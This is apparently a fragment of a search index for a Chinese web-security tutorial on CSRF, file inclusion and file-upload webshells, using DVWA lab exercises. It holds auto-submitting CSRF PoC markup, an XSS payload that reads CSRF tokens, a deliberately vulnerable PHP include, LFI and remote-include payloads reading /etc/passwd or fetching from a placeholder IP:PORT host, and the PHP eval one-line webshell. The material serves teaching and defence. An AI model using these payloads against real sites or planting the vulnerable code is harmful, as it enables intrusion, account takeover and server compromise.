\u9ad8\u5371\u64cd\u4f5c\u52a0\u5165\u9a8c\u8bc1\u7801\u673a\u5236","title":"CSRF"},{"location":"web/csrf/#csrf","text":"","title":"CSRF"},{"location":"web/csrf/#csrf_1","text":"CSRF(CrossSiteRequestForgery), \u4e2d\u6587\u662f\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020. CSRF\u653b\u51fb\u8005\u5728\u7528\u6237\u5df2\u7ecf\u767b\u5f55\u76ee\u6807\u7f51\u7ad9\u4e4b\u540e, \u8bf1\u4f7f\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u653b\u51fb\u9875\u9762, \u5229\u7528\u76ee\u6807\u7f51\u7ad9\u5bf9\u7528\u6237\u7684\u4fe1\u4efb, \u4ee5\u7528\u6237\u8eab\u4efd\u5728\u653b\u51fb\u9875\u9762\u5bf9\u76ee\u6807\u7f51\u7ad9\u53d1\u8d77\u4f2a\u9020\u7528\u6237\u64cd\u4f5c\u7684\u8bf7\u6c42, \u6bd4\u5982\u4ee5\u4f60\u7684\u540d\u4e49\u53d1\u9001\u90ae\u4ef6, \u53d1\u6d88\u606f, \u76d7\u53d6\u4f60\u7684\u8d26\u53f7, \u6dfb\u52a0\u7cfb\u7edf\u7ba1\u7406\u5458, \u751a\u81f3\u4e8e\u8d2d\u4e70\u5546\u54c1, \u865a\u62df\u8d27\u5e01\u8f6c\u8d26\u7b49, \u8fbe\u5230\u653b\u51fb\u76ee\u7684. CSRF \u548c XSS \u6700\u5927\u7684\u533a\u522b\u5c31\u5728\u4e8e, CSRF \u5e76\u6ca1\u6709\u76d7\u53d6 cookie \u800c\u662f\u76f4\u63a5\u5229\u7528. XSS \u53ef\u4ee5\u901a\u8fc7 document.cookies \u83b7\u53d6 cookie .","title":"CSRF \u6f0f\u6d1e\u539f\u7406"},{"location":"web/csrf/#_1","text":"\u7528\u6237\u6253\u5f00\u6d4f\u89c8\u5668, \u8bbf\u95ee\u53d7\u4fe1\u4efb\u7684\u7f51\u7ad9, \u4f46\u662f\u8be5\u7f51\u7ad9\u5b58\u5728 CSRF \u6f0f\u6d1e, \u7528\u6237\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u6b63\u5e38\u767b\u5f55 \u5728\u7528\u6237\u4fe1\u606f\u901a\u8fc7\u9a8c\u8bc1\u540e, \u8be5\u7f51\u7ad9\u4ea7\u751f\u4e86cookie\u4fe1\u606f\u5e76\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668, \u7528\u6237\u767b\u5f55\u6210\u529f, \u53ef\u4ee5\u6b63\u5e38\u64cd\u4f5c \u7528\u6237\u4e3a\u9000\u51fa\u767b\u5f55\u7684\u60c5\u51b5\u4e0b, \u5728\u540c\u4e00\u6d4f\u89c8\u5668\u4e2d, \u6253\u5f00\u65b0\u7684 Tab \u8bbf\u95ee\u4e86\u67d0\u4e2a\u6076\u610f\u7f51\u7ad9 \u6076\u610f\u7f51\u7ad9\u4f1a\u8fd4\u56de\u4e00\u4e9b\u6709\u653b\u51fb\u6027\u7684\u4ee3\u7801, \u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5229\u7528\u7528\u6237\u7684 cookie \u4fe1\u606f\u5bf9\u539f\u7f51\u7ad9\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c","title":"\u6f0f\u6d1e\u573a\u666f"},{"location":"web/csrf/#csrf_2","text":"","title":"CSRF \u6f0f\u6d1e\u6316\u6398"},{"location":"web/csrf/#csrf_3","text":"","title":"CSRF \u6f0f\u6d1e\u6316\u6398\u601d\u8def"},{"location":"web/csrf/#_2","text":"\u6d4b\u8bd5\u4e00\u4e9b\u654f\u611f\u529f\u80fd\u70b9, \u7279\u522b\u5173\u6ce8\u540e\u53f0\u9ad8\u5371\u529f\u80fd\u70b9, \u6293\u5305\u770b\u662f\u5426\u542b\u6709token\u53c2\u6570, \u5982\u679c\u6ca1\u6709, \u518d\u76f4\u63a5 \u8bf7\u6c42\u8fd9\u4e2a\u9875\u9762, \u4e0d\u5e26 referer, \u5982\u679c\u8fd4\u56de\u6570\u636e\u8fd8\u662f\u4e00\u6837\u7684, \u90a3\u8bf4\u660e\u5f88\u6709\u53ef\u80fd\u5b58\u5728 CSRF \u6f0f\u6d1e .","title":"\u9ed1\u76d2\u6316\u6398"},{"location":"web/csrf/#_3","text":"\u8bfb\u53d6\u4ee3\u7801\u7684\u6838\u5fc3\u6587\u4ef6, \u67e5\u770b\u91cc\u8fb9\u6709\u6ca1\u6709\u9a8c\u8bc1 token \u548c referer \u76f8\u5173\u7684\u4ee3\u7801 . \u6216\u8005\u76f4\u63a5\u641c\u7d22 token \u8fd9\u4e2a \u5173\u952e\u5b57 , \u518d\u53bb\u770b\u4e00\u4e0b\u6bd4\u8f83\u5173\u5fc3\u7684\u529f\u80fd\u70b9\u7684\u4ee3\u7801\u6709\u6ca1\u6709\u9a8c\u8bc1 . DESTOON \u4ece CSRF \u5230 GETSHELL: https://bbs.ichunqiu.com/thread-27413-1-1.html","title":"\u767d\u76d2\u6316\u6398"},{"location":"web/csrf/#get-csrf","text":"\u4fee\u6539 DVWA \u5b89\u5168\u7b49\u7ea7\u4e3a Low, \u7136\u540e\u5230 CSRF \u6d4b\u8bd5\u73af\u5883, \u7528\u6237\u4fee\u6539\u5bc6\u7801\u9700\u8981\u8fde\u7eed\u8f93\u5165\u4e24\u6b21\u65b0\u5bc6\u7801, \u5728\u63d0\u4ea4\u7684\u7684\u65f6\u5019\u901a\u8fc7 BurpSuite \u6293\u53d6\u6570\u636e\u5305, low \u7ea7\u522b\u7684 csrf \u73af\u5883\u4ec5\u901a\u8fc7 GET \u65b9\u6cd5\u8fdb\u884c\u5bc6\u7801\u4fee\u6539, \u6ca1\u6709\u4efb\u4f55\u6821\u9a8c, \u6240\u4ee5\u901a\u8fc7\u4f2a\u9020\u7b26\u5408\u8981\u6c42\u7684 URL, \u8bf1\u4f7f\u7528\u6237\u8fdb\u884c\u70b9\u51fb\u5c31\u53ef\u4ee5\u505a\u5230\u4efb\u610f\u5bc6\u7801\u7684\u4fee\u6539. \u4f7f\u7528 BurpSuite \u7684 PoC \u751f\u6210\u5de5\u5177\u53ef\u4ee5\u5feb\u901f\u751f\u6210\u6d4b\u8bd5\u9875\u9762 . \u4e3a\u4e86\u8ba9\u53d7\u5bb3\u8005\u65e0\u6cd5\u5bdf\u89c9\u5230\u653b\u51fb\u6216\u51cf\u5c11\u5bf9\u653b\u51fb\u7684\u6000\u7591, \u53ef\u4ee5\u5bf9 PoC \u8fdb\u884c\u6539\u9020 . \u5220\u9664 <input type=\"submit\" value=\"Submit request\" /> \u540e\u9875\u9762\u65e0\u63d0\u4ea4\u6309\u94ae \u6dfb\u52a0 <script>document.forms[0].submit(); \u81ea\u52a8\u63d0\u4ea4\u8bf7\u6c42, \u8bbf\u95ee\u9875\u9762\u76f4\u63a5\u53d1\u9001\u8bf7\u6c42 \u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\u4f2a\u9020\u7684\u94fe\u63a5\u540e\u5bc6\u7801\u88ab\u4fee\u6539","title":"GET \u578b CSRF"},{"location":"web/csrf/#referer","text":"\u4fee\u6539 DVWA \u7684\u5b89\u5168\u7b49\u7ea7\u4e3a Medium, \u6b64\u65f6 CSRF \u73af\u5883\u6dfb\u52a0\u4e86\u5bf9 Referer \u5b57\u6bb5\u7684\u5224\u65ad, \u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u6cd5\u4f7f\u7528 BurpSuite \u751f\u6210\u7684 CSRF HTML \u65e0\u6cd5\u4fee\u6539\u5bc6\u7801. Referer \u5c5e\u6027\u8fd4\u56de\u8f7d\u5165\u5f53\u524d\u6587\u6863\u7684\u6765\u6e90\u6587\u6863\u7684 URL, \u5982\u679c\u5f53\u524d\u6587\u6863\u4e0d\u662f\u901a\u8fc7\u8d85\u7ea7\u94fe\u63a5\u8bbf\u95ee\u7684, \u5219\u4e3a null, \u6b64\u5c5e\u6027\u5141\u8bb8\u5ba2\u6237\u7aef JavaScript \u8bbf\u95ee HTTP \u5f15\u7528\u5934\u90e8. \u7531\u4e8e Referer \u5b57\u6bb5\u53ef\u4ee5\u901a\u8fc7\u5ba2\u6237\u7aef\u8fdb\u884c\u63a7\u5236, \u662f\u4e0d\u53ef\u4fe1\u7684\u5b57\u6bb5, \u6240\u4ee5\u5728 BurpSuite \u4e2d\u901a\u8fc7 Repeater \u53d1\u9001\u5e26\u6709 Referer \u7684\u8bf7\u6c42\u6216\u4f7f\u7528 HackBar \u4e3a\u6d4f\u89c8\u5668\u8bf7\u6c42\u6dfb\u52a0 Referer \u5b57\u6bb5\u53ef\u4ee5\u7ed5\u8fc7, \u5c1d\u8bd5\u5728 BurpSuite \u751f\u6210\u7684 CSRF HTML \u4e2d\u4f7f\u7528 JS \u4fee\u6539 Referer, \u4f46\u672a\u80fd\u6210\u529f ...","title":"\u7a81\u7834 Referer \u7684\u68c0\u6d4b"},{"location":"web/csrf/#token","text":"\u4fee\u6539 DVWA \u7684\u5b89\u5168\u7b49\u7ea7\u4e3a high, \u53d1\u73b0\u8bf7\u6c42\u4e2d\u591a\u4e86 user_token . \u6b64\u65f6\u53d1\u9001\u4fee\u6539\u5bc6\u7801\u7684\u8bf7\u6c42\u4f1a\u63d0\u793a CSRF token \u4e0d\u6b63\u786e, token \u5728\u8ba1\u7b97\u673a\u8eab\u4efd\u8ba4\u8bc1\u4e2d\u8868\u793a\u4e34\u65f6\u4ee4\u724c, \u6bcf\u6b21\u4fee\u6539\u5bc6\u7801\u90fd\u4f1a\u91cd\u7f6e token, \u6bcf\u6b21\u4fee\u6539\u5bc6\u7801\u90fd\u4f1a\u4f7f\u7528\u65b0\u7684 token, \u6240\u4ee5\u8fdb\u884c CSRF \u653b\u51fb\u5fc5\u987b\u83b7\u53d6\u5230\u6709\u6548\u7684 token \u624d\u53ef\u4ee5 . \u5728 DVWA \u4e2d\u53ef\u4ee5\u7ed3\u5408\u53cd\u5c04\u578b XSS \u6f0f\u6d1e\u83b7\u53d6 CSRF \u9875\u9762\u7684 token . < iframe src = \"../csrf\" onload = alert(frames[0].document.getElementsByName('user_token')[0].value) > \u4f7f\u7528 XSS \u83b7\u5f97\u7684 token, \u914d\u5408 Burpsuite \u751f\u6210\u7684 CSRF HTML, \u53ef\u4ee5\u6210\u529f\u4fee\u6539\u5bc6\u7801 .","title":"\u7a81\u7834 Token \u68c0\u6d4b"},{"location":"web/csrf/#post-csrf","text":"\u4f7f\u7528 POST \u65b9\u5f0f\u7684\u8bf7\u6c42, \u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7 URL \u8bbf\u95ee\u7684\u65b9\u5f0f\u89e6\u53d1 CSRF, \u9700\u8981\u653b\u51fb\u8005\u6784\u9020 POC, \u5229\u7528\u5176\u4ed6\u65b9\u5f0f\u89e6\u53d1\u6f0f\u6d1e . \u5728 BurpSuite \u4e2d\u53f3\u952e Engagement tools --> Generate CSRF PoC \u5feb\u901f\u751f\u6210 CSRF HTML \u9875\u9762 .","title":"POST \u578b CSRF"},{"location":"web/csrf/#csrf_4","text":"","title":"CSRF \u6f0f\u6d1e\u5229\u7528"},{"location":"web/csrf/#xss-csrf-xsrf","text":"\u901a\u8fc7\u4fe1\u606f\u68c0\u7d22\u53d1\u73b0\u7f51\u7ad9\u7684 CMS \u76f8\u5173\u4fe1\u606f \u901a\u8fc7 CMS \u4fe1\u606f\u641c\u7d22\u5386\u53f2\u6f0f\u6d1e, \u53d1\u73b0\u8bba\u575b\u7559\u8a00\u677f\u5b58\u5728 XSS \u6f0f\u6d1e, \u540e\u53f0\u7528\u6237\u4fee\u6539\u5bc6\u7801\u5b58\u5728 CSRF \u6f0f\u6d1e \u63d2\u5165 XSS \u6f0f\u6d1e Payload, \u76ee\u7684\u4e3a\u89e6\u53d1 CSRF \u6f0f\u6d1e\u4fee\u6539\u7528\u6237\u5bc6\u7801 \u7f51\u7ad9\u7528\u6237\u767b\u5f55\u540e\u67e5\u770b\u7559\u8a00\u89e6\u53d1\u6f0f\u6d1e \u4fee\u6539 DVWA \u5b89\u5168\u7b49\u7ea7\u4e3a Low, \u7136\u540e\u6293\u53d6 CSRF \u4fee\u6539\u5bc6\u7801\u7684\u8bf7\u6c42, \u5728\u5b58\u50a8\u578b XSS \u7684 message \u4e2d\u63d2\u5165 img \u6807\u7b7e, \u5f53\u67e5\u770b\u8fd9\u6761\u4fe1\u606f\u65f6\u5c31\u4f1a\u89e6\u53d1 CSRF, \u5728\u7528\u6237\u672a\u5bdf\u89c9\u7684\u60c5\u51b5\u4e0b\u4fee\u6539\u5bc6\u7801 . //DVWA \u9650\u5236\u53ea\u80fd\u8f93\u5165 50 \u4e2a\u5b57\u7b26, F12 \u63a7\u5236\u53f0\u7f16\u8f91 maxlength \u7684\u503c\u53ef\u89e3\u9664\u8be5\u9650\u5236 < textarea name = \"mtxMessage\" cols = \"50\" rows = \"3\" maxlength = \"50\" ></ textarea >","title":"XSS + CSRF \u7ec4\u5408 XSRF"},{"location":"web/csrf/#csrf_5","text":"\u9020\u6210\u7684\u95ee\u9898\u53ef\u80fd\u5305\u62ec: \u4e2a\u4eba\u9690\u79c1\u6cc4\u9732, \u673a\u5bc6\u8d44\u6599\u6cc4\u9732, \u7528\u6237\u751a\u81f3\u4f01\u4e1a\u7684\u8d22\u4ea7\u5b89\u5168 \u4ee5\u53d7\u5bb3\u8005\u540d\u4e49\u53d1\u90ae\u4ef6, \u53d1\u6d88\u606f . \u76d7\u53d6\u53d7\u5bb3\u8005\u7684\u8d26\u53f7, \u751a\u81f3\u8d2d\u4e70\u5546\u54c1, \u865a\u62df\u8d27\u5e01\u8f6c\u8d26 . \u4fee\u6539\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u914d\u7f6e(\u6bd4\u5982\u4fee\u6539\u8def\u7531\u5668DNS\u3001\u91cd\u7f6e\u8def\u7531\u5668\u5bc6\u7801) . \u7f51\u7ad9\u540e\u53f0\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237, \u7834\u574f\u7f51\u7ad9, \u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u7b49 .","title":"CSRF \u6f0f\u6d1e\u5371\u5bb3"},{"location":"web/csrf/#csrf_6","text":"","title":"CSRF \u6f0f\u6d1e\u9632\u62a4"},{"location":"web/csrf/#csrf_7","text":"\u9a8c\u8bc1\u8bf7\u6c42\u5934\u4e2d\u7684 HTTP Referer \u5b57\u6bb5 \u5728\u8bf7\u6c42\u5305\u4e2d\u6dfb\u52a0 token \u5e76\u9a8c\u8bc1 \u5728 HTTP \u5934\u4e2d\u81ea\u5b9a\u4e49\u5c5e\u6027\u5e76\u9a8c\u8bc1 \u9ad8\u5371\u64cd\u4f5c\u52a0\u5165\u9a8c\u8bc1\u7801\u673a\u5236","title":"CSRF \u5e38\u89c4\u9632\u5fa1\u65b9\u5f0f"},{"location":"web/file_include/","text":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6982\u8ff0 \u6587\u4ef6\u5305\u542b\u7b80\u4ecb \u5f00\u53d1\u8005\u5c06\u91cd\u590d\u4f7f\u7528\u7684\u51fd\u6570\u5199\u5165\u5355\u4e2a\u6587\u4ef6, \u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u51fd\u6570\u65f6\u76f4\u63a5\u8c03\u7528\u8be5\u6587\u4ef6, \u65e0\u9700\u518d\u6b21\u7f16\u5199, \u6587\u4ef6\u8c03\u7528\u7684\u8fc7\u7a0b\u79f0\u4e3a\u6587\u4ef6\u5305\u542b \u6587\u4ef6\u5305\u542b\u5206\u7c7b \u672c\u5730\u6587\u4ef6\u5305\u542b LFI (Local File Include) \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b RFI (Remote File Include) allow_url_fopen=On \u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u7f51\u7ad9\u68c0\u7d22\u6570\u636e allow_url_include=On \u5141\u8bb8 include / require \u8fdc\u7a0b\u6587\u4ef6 php \u6587\u4ef6\u5305\u542b\u51fd\u6570 include \u4e0e require \u9664\u4e86\u9519\u8bef\u5904\u7406\u57fa\u672c\u76f8\u540c include() \u5728\u5305\u542b\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef, \u751f\u6210\u8b66\u544a (E_WARNING), \u811a\u672c\u7ee7\u7eed\u6267\u884c require() \u5728\u5305\u542b\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef, \u751f\u6210\u81f4\u547d\u9519\u8bef (E_COMPILE_ERROR), \u811a\u672c\u505c\u6b62\u6267\u884c include_once() \u4e0e require_once() \u7279\u6027\u540c\u4e0a, \u4e0d\u540c\u5728\u4e8e\u82e5\u6587\u4ef6\u5df2\u5305\u542b, \u5219\u4e0d\u518d\u5305\u542b, \u53ef\u4ee5\u907f\u514d\u51fd\u6570\u91cd\u5b9a\u4e49, \u53d8\u91cf\u91cd\u65b0\u8d4b\u503c <?php function to_print ( $name ){ echo \" { $name } is print this func<hr/>\" } ?> <?php include ( 'func.php' ); to_print ( 'jack' ); ?> <?php include ( 'func.php' ); to_print ( 'bob' ); ?> \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e \u5f00\u53d1\u8005\u4e3a\u4e86\u4f7f\u4ee3\u7801\u66f4\u7075\u6d3b, \u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u8bbe\u7f6e\u4e3a\u53d8\u91cf, \u7528\u6765\u8fdb\u884c\u52a8\u6001\u8c03\u7528, \u9020\u6210\u4e86\u5ba2\u6237\u7aef\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u6587\u4ef6, \u51fa\u73b0\u4e86\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e. \u901a\u8fc7 PHP \u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6, \u4f20\u5165\u7684\u6587\u4ef6\u540d\u672a\u8fdb\u884c\u5408\u7406\u9a8c\u8bc1, \u6267\u884c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6, \u6700\u7ec8\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u9732\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165. <?php error_reporting ( 0 ); $file = $_GET [ \"file\" ]; include $file ; highlight_file ( __FILE__ ); ?> http://example.com/include.php?file=/etc/passwd \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5229\u7528 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 file:// \u4e0e\u76f4\u63a5\u5305\u542b ?file=file:///etc/passwd \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b ?file=http://IP:PORT/phpinfo.php \u5305\u542b\u4e0a\u4f20\u6587\u4ef6 \u6587\u4ef6\u5305\u542b\u51fd\u6570\u4f1a\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u5f53\u4f5cPHP\u4ee3\u7801\u53bb\u89e3\u6790\uff0c\u90a3\u4e48\u6211\u53ef\u4ee5\u5bfb\u627e\u7f51\u7ad9\u4e0a\u7684\u4e0a\u4f20\u529f\u80fd\uff0c\u4e0a\u4f20\u5e26\u6709\u6076\u610f\u4ee3\u7801\u7684\u56fe\u7247\u3001\u6587\u4ef6\u7b49\u7b49\uff0c\u5728\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u51fd\u6570\u8fdb\u884c\u5305\u542b\u3002 \u5305\u542b\u65e5\u5fd7\u6587\u4ef6 WEB\u670d\u52a1\u5668\u4e00\u822c\u4f1a\u5c06\u7528\u6237\u7684\u8bbf\u95ee\u8bb0\u5f55\u4fdd\u5b58\u5728\u8bbf\u95ee\u65e5\u5fd7\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u65e5\u5fd7\u8bb0\u5f55\u7684\u5185\u5bb9\uff0c\u7cbe\u5fc3\u6784\u9020\u8bf7\u6c42\uff0c\u628aPHP\u4ee3\u7801\u63d2\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6765\u6267\u884c\u65e5\u5fd7\u4e2d\u7684PHP\u4ee3\u7801\u3002 \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7ed5\u8fc7 \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u9632\u5fa1","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"web/file_include/#_1","text":"","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"web/file_include/#_2","text":"","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6982\u8ff0"},{"location":"web/file_include/#_3","text":"\u5f00\u53d1\u8005\u5c06\u91cd\u590d\u4f7f\u7528\u7684\u51fd\u6570\u5199\u5165\u5355\u4e2a\u6587\u4ef6, \u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u51fd\u6570\u65f6\u76f4\u63a5\u8c03\u7528\u8be5\u6587\u4ef6, \u65e0\u9700\u518d\u6b21\u7f16\u5199, \u6587\u4ef6\u8c03\u7528\u7684\u8fc7\u7a0b\u79f0\u4e3a\u6587\u4ef6\u5305\u542b","title":"\u6587\u4ef6\u5305\u542b\u7b80\u4ecb"},{"location":"web/file_include/#_4","text":"\u672c\u5730\u6587\u4ef6\u5305\u542b LFI (Local File Include) \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b RFI (Remote File Include) allow_url_fopen=On \u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u7f51\u7ad9\u68c0\u7d22\u6570\u636e allow_url_include=On \u5141\u8bb8 include / require \u8fdc\u7a0b\u6587\u4ef6","title":"\u6587\u4ef6\u5305\u542b\u5206\u7c7b"},{"location":"web/file_include/#php","text":"include \u4e0e require \u9664\u4e86\u9519\u8bef\u5904\u7406\u57fa\u672c\u76f8\u540c include() \u5728\u5305\u542b\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef, \u751f\u6210\u8b66\u544a (E_WARNING), \u811a\u672c\u7ee7\u7eed\u6267\u884c require() \u5728\u5305\u542b\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef, \u751f\u6210\u81f4\u547d\u9519\u8bef (E_COMPILE_ERROR), \u811a\u672c\u505c\u6b62\u6267\u884c include_once() \u4e0e require_once() \u7279\u6027\u540c\u4e0a, \u4e0d\u540c\u5728\u4e8e\u82e5\u6587\u4ef6\u5df2\u5305\u542b, \u5219\u4e0d\u518d\u5305\u542b, \u53ef\u4ee5\u907f\u514d\u51fd\u6570\u91cd\u5b9a\u4e49, \u53d8\u91cf\u91cd\u65b0\u8d4b\u503c <?php function to_print ( $name ){ echo \" { $name } is print this func<hr/>\" } ?> <?php include ( 'func.php' ); to_print ( 'jack' ); ?> <?php include ( 'func.php' ); to_print ( 'bob' ); ?>","title":"php \u6587\u4ef6\u5305\u542b\u51fd\u6570"},{"location":"web/file_include/#_5","text":"\u5f00\u53d1\u8005\u4e3a\u4e86\u4f7f\u4ee3\u7801\u66f4\u7075\u6d3b, \u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u8bbe\u7f6e\u4e3a\u53d8\u91cf, \u7528\u6765\u8fdb\u884c\u52a8\u6001\u8c03\u7528, \u9020\u6210\u4e86\u5ba2\u6237\u7aef\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u6587\u4ef6, \u51fa\u73b0\u4e86\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e. \u901a\u8fc7 PHP \u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6, \u4f20\u5165\u7684\u6587\u4ef6\u540d\u672a\u8fdb\u884c\u5408\u7406\u9a8c\u8bc1, \u6267\u884c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6, \u6700\u7ec8\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u9732\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165. <?php error_reporting ( 0 ); $file = $_GET [ \"file\" ]; include $file ; highlight_file ( __FILE__ ); ?> http://example.com/include.php?file=/etc/passwd","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"web/file_include/#_6","text":"","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5229\u7528"},{"location":"web/file_include/#_7","text":"file:// \u4e0e\u76f4\u63a5\u5305\u542b ?file=file:///etc/passwd","title":"\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"web/file_include/#_8","text":"?file=http://IP:PORT/phpinfo.php","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b"},{"location":"web/file_include/#_9","text":"\u6587\u4ef6\u5305\u542b\u51fd\u6570\u4f1a\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u5f53\u4f5cPHP\u4ee3\u7801\u53bb\u89e3\u6790\uff0c\u90a3\u4e48\u6211\u53ef\u4ee5\u5bfb\u627e\u7f51\u7ad9\u4e0a\u7684\u4e0a\u4f20\u529f\u80fd\uff0c\u4e0a\u4f20\u5e26\u6709\u6076\u610f\u4ee3\u7801\u7684\u56fe\u7247\u3001\u6587\u4ef6\u7b49\u7b49\uff0c\u5728\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u51fd\u6570\u8fdb\u884c\u5305\u542b\u3002","title":"\u5305\u542b\u4e0a\u4f20\u6587\u4ef6"},{"location":"web/file_include/#_10","text":"WEB\u670d\u52a1\u5668\u4e00\u822c\u4f1a\u5c06\u7528\u6237\u7684\u8bbf\u95ee\u8bb0\u5f55\u4fdd\u5b58\u5728\u8bbf\u95ee\u65e5\u5fd7\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u65e5\u5fd7\u8bb0\u5f55\u7684\u5185\u5bb9\uff0c\u7cbe\u5fc3\u6784\u9020\u8bf7\u6c42\uff0c\u628aPHP\u4ee3\u7801\u63d2\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6765\u6267\u884c\u65e5\u5fd7\u4e2d\u7684PHP\u4ee3\u7801\u3002","title":"\u5305\u542b\u65e5\u5fd7\u6587\u4ef6"},{"location":"web/file_include/#_11","text":"","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7ed5\u8fc7"},{"location":"web/file_include/#_12","text":"","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u9632\u5fa1"},{"location":"web/file_upload/","text":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e WebShell\u7b80\u4ecb WebShell \u7b80\u79f0\u7f51\u9875\u540e\u95e8, \u662f\u884c\u5728 Web \u5e94\u7528\u4e4b\u4e0a\u7684\u8fdc\u7a0b\u63a7\u5236\u7a0b\u5e8f. WebShell \u5176\u5b9e\u5c31\u662f\u4e00\u5f20\u7f51\u9875, \u7531 PHP\u3001JSP\u3001ASP\u3001ASP.NET \u7b49\u8fd9\u7c7b Web \u5e94\u7528\u7a0b\u5e8f\u8bed\u8a00\u5f00\u53d1, \u4f46 WebShell \u5e76\u4e0d\u5177\u5907\u5e38\u89c1\u7f51\u9875\u7684\u529f\u80fd, \u4f8b\u5982\u767b\u5f55\u3001\u6ce8\u518c\u3001\u4fe1\u606f\u5c55\u793a\u7b49\u529f\u80fd, \u4e00\u822c\u4f1a\u5177\u5907\u6587\u4ef6\u7ba1\u7406\u3001\u7aef\u53e3\u626b\u63cf\u3001\u63d0\u6743\u3001\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\u7b49\u529f\u80fd. \u62e5\u6709\u8f83\u5b8c\u6574\u529f\u80fd\u7684 WebShell, \u6211\u4eec\u4e00\u822c\u79f0\u4e3a\u5927\u9a6c. \u529f\u80fd\u7b80\u6613\u7684 Webshell \u79f0\u4e3a\u5c0f\u9a6c. \u9664\u6b64\u4e4b\u5916\u8fd8\u5b58\u5728\u4e00\u53e5\u8bdd\u6728\u9a6c\u3001\u83dc\u5200\u9a6c\u3001\u8131\u5e93\u9a6c\u7b49\u540d\u8bcd, \u662f\u5bf9\u4e8e WebShell \u529f\u80fd\u6216\u8005\u7279\u6027\u7684\u7b80\u79f0\u3002 \u4e00\u53e5\u8bdd\u6728\u9a6c php \u4e00\u53e5\u8bdd\u6728\u9a6c <?php @ eval ( $_POST [ x ]); ?> \u83b7\u53d6 POST \u8bf7\u6c42\u53c2\u6570\u4e2d x \u7684\u503c\u3002\u4f8b\u5982 POST \u8bf7\u6c42\u4e2d\u4f20\u9012 x=phpinfo(); \u90a3\u4e48 $_POST[x] \u5c31\u7b49\u540c\u4e8e phpinfo(); eval() \u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c PHP \u4ee3\u7801\u6267\u884c\u3002\u4f8b\u5982 eval('phpinfo();'), \u5176\u4e2d phpinfo();`\u4f1a\u88ab\u5f53\u505aPHP\u4ee3\u7801\u53bb\u6267\u884c\u3002 @ \u662f\u9519\u8bef\u63a7\u5236\u8fd0\u7b97\u7b26\uff0c\u5f53\u653e\u7f6e\u5728\u4e00\u4e2aPHP\u8868\u8fbe\u5f0f\u524d\u65f6\uff0c\u8be5\u8868\u8fbe\u5f0f\u4ea7\u751f\u7684\u4efb\u4f55\u9519\u8bef\u4fe1\u606f\u90fd\u88ab\u5ffd\u7565\u6389\u3002 ASP \u4e00\u53e5\u8bdd\u6728\u9a6c 